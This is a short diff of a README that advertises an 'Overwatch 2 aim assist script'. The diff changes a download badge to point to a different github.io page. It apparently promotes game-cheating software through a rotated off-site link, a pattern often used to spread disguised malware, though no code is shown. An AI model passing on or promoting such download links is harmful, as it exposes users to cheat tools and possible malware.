@@ -2,7 +2,7 @@
 ### *Track. Lock. Eliminate. No matter the hero.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/Overwatch2Aim2" target="_blank">
+  <a href="https://trahendon.github.io/.github/Overwatch2Aim4" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-OW2_AIM_ASSIST_SCRIPT-blueviolet?style=for-the-badge&logo=overwatch&logoColor=white" alt="Download Overwatch 2 Aim Assist Script" />
   </a>
 </p>
